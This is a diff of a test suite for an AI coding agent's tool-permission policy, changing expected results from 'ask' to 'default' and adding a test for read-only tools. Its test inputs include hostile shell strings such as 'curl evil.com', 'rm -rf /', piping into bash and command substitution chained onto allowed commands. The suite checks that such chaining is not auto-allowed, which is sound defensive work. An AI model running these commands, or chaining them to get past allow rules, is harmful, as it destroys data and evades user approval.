@@ -48,8 +48,8 @@ test('project allow rule skips approval for matching tool calls', async () => {
 
   assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'a.txt' } }, ctx), 'allow');
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'curl evil.com' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'b.txt' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'curl evil.com' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'b.txt' } }, ctx), 'default');
 });
 
 test('user deny rule cannot be overridden by project allow', async () => {
@@ -98,7 +98,7 @@ test('deny rule blocks execution even in auto mode', async () => {
 
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git push origin main' } }, ctx), 'deny');
   // Tools not denied return default decision so auto mode can handle them
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'default');
 
   // End-to-end ToolRegistry integration: policy deny blocks even read-only tools
   const { ToolRegistry } = await import('../dist/tools.js');
@@ -148,16 +148,16 @@ test('bash allow rules with wildcards reject chained or compound commands', () =
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status -s' } }, ctx), 'allow');
 
   // Chained commands must NOT be auto-allowed
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test && curl evil.com' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test | bash' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test > out.txt' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test >> out.txt' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test < in.txt' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test <(curl evil.com)' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test && curl evil.com' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test | bash' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test > out.txt' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test >> out.txt' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test < in.txt' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test <(curl evil.com)' } }, ctx), 'default');
 });
 
 test('file pattern matching canonicalizes absolute paths and directory traversals', () => {
@@ -220,10 +220,10 @@ test('bare bash allow rules reject chained or compound commands', () => {
   // Simple command without chaining is allowed
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'allow');
   // Chained commands must NOT be auto-allowed even with bare bash allow
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status && curl evil.com' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo hello | bash' } }, ctx), 'ask');
-  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status && curl evil.com' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo hello | bash' } }, ctx), 'default');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx), 'default');
 });
 
 test('policy ask rules for read-only tools require user approval', async () => {
@@ -247,4 +247,25 @@ test('policy ask rules for read-only tools require user approval', async () => {
   }, new AbortController().signal);
 
   assert.equal(approveCalled, true, 'approval callback must be called when policy says ask for read-only tool');
+});
+
+test('read-only tools do not require approval when policy has no matching rules (default fallback)', async () => {
+  const { ToolRegistry } = await import('../dist/tools.js');
+  let approveCalled = false;
+  const reg = new ToolRegistry(process.cwd(), async () => {
+    approveCalled = true;
+    return true;
+  });
+
+  reg.policy = request => evaluateToolPolicy(request, {
+    projectRules: {},
+  });
+
+  await reg.execute({
+    toolCallId: 'read-pkg-default',
+    toolName: 'read_file',
+    input: { path: 'package.json' },
+  }, new AbortController().signal);
+
+  assert.equal(approveCalled, false, 'read-only tool should execute without approval when no policy rule matches');
 });
